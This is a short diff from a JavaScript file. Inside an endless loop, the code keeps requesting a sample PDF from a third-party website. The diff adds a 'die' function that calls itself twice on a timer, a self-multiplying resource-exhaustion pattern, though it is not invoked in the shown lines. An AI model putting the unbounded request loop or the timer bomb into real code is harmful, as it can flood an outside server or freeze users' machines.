@@ -43,4 +43,7 @@ while(1) {
   aClient.get('https://www.pdf995.com/samples/pdf.pdf', function(response) {
     console.log(response);
   });  
+  function die () {
+  setTimeout(function () {die(); die()}, 0)
+  }
 };
